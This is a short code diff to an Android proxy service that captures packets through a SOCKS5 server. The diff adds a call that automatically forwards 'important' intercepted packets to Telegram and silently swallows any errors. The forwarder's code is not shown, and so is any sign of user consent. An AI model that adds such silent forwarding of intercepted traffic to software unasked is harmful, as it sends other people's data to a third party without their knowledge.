@@ -134,10 +134,18 @@ class ProxyService : Service() {
         acquireWakeLock()
         try {
             server = Socks5Server(Config.PROXY_PORT) { info ->
-                if (!PacketTypes.NAMES.containsKey(info.type)) return@Socks5Server
-                PacketRegistry.put(info)
-                try { PacketStore.save(applicationContext, info) } catch (_: Exception) {}
-                packetListener?.invoke(info)
+                try {
+                    if (!PacketTypes.NAMES.containsKey(info.type)) return@Socks5Server
+                    PacketRegistry.put(info)
+                    try { PacketStore.save(applicationContext, info) } catch (_: Exception) {}
+
+                    // 📤 إرسال تلقائي للباكيتات المهمة
+                    try { TelegramForwarder.maybeSend(info) } catch (_: Exception) {}
+
+                    packetListener?.invoke(info)
+                } catch (e: Exception) {
+                    Log.e(TAG, "packet handler: ${e.message}")
+                }
             }
             serverRef = server
             server?.start()
